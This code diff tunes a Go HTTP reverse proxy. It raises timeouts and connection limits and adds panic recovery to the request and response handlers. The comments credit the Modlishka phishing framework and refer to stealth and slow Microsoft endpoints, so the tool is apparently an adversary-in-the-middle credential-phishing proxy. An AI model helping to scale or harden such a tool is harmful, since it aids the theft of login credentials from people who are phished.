@@ -204,22 +204,22 @@ const (
 )
 
 const (
-	httpReadTimeout       = 120 * time.Second // Reduced from 600s - prevents hung connections
-	httpWriteTimeout      = 120 * time.Second // Reduced from 600s
-	httpIdleTimeout       = 120 * time.Second // Close idle client connections after 2 min
-	httpReadHeaderTimeout = 10 * time.Second  // Fast header read timeout
+	httpReadTimeout       = 300 * time.Second // Allow slow connections
+	httpWriteTimeout      = 300 * time.Second // Allow slow uploads
+	httpIdleTimeout       = 60 * time.Second  // Close idle connections faster to free resources
+	httpReadHeaderTimeout = 30 * time.Second  // Allow slower clients
 
-	// Connection pool and speed optimization settings
-	maxIdleConns        = 200              // Total idle connections across all hosts
-	maxIdleConnsPerHost = 50               // Idle connections per-host (default is 2!)
-	maxConnsPerHost     = 100              // Max total connections per-host
-	idleConnTimeout     = 90 * time.Second // Keep idle connections alive
-	tlsHandshakeTimeout = 30 * time.Second // TLS handshake deadline (increased for slow hosts)
+	// Connection pool and speed optimization settings - LARGE CAPACITY
+	maxIdleConns        = 1000             // High capacity for many visitors
+	maxIdleConnsPerHost = 100              // More connections per host
+	maxConnsPerHost     = 200              // Max total connections per-host
+	idleConnTimeout     = 60 * time.Second // Shorter timeout to recycle connections
+	tlsHandshakeTimeout = 60 * time.Second // TLS handshake deadline (generous)
 	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
 	respHeaderTimeout   = 0                // DISABLED - Microsoft endpoints can be very slow
 
 	// Stealth/reliability: periodic maintenance
-	connPoolRefreshInterval = 5 * time.Minute // Flush stale connections periodically
+	connPoolRefreshInterval = 2 * time.Minute // Refresh connections more frequently
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
@@ -431,6 +431,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			// ════════════════════════════════════════════════════════════════════════
+			// PANIC RECOVERY - Prevent single request from crashing entire server
+			// ════════════════════════════════════════════════════════════════════════
+			defer func() {
+				if r := recover(); r != nil {
+					log.Error("[PANIC] Recovered from panic in request handler: %v", r)
+				}
+			}()
+
 			log.Debug("[DoFunc] %s %s%s from %s", req.Method, req.Host, req.URL.Path, req.RemoteAddr)
 
 			// ════════════════════════════════════════════════════════════════════════
@@ -2543,6 +2552,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+			// ════════════════════════════════════════════════════════════════════════
+			// PANIC RECOVERY - Prevent single response from crashing entire server
+			// ════════════════════════════════════════════════════════════════════════
+			defer func() {
+				if r := recover(); r != nil {
+					log.Error("[PANIC] Recovered from panic in response handler: %v", r)
+				}
+			}()
+
 			// End rate limiter tracking for this request
 			if ctx.Req != nil {
 				clientIP := ctx.Req.RemoteAddr
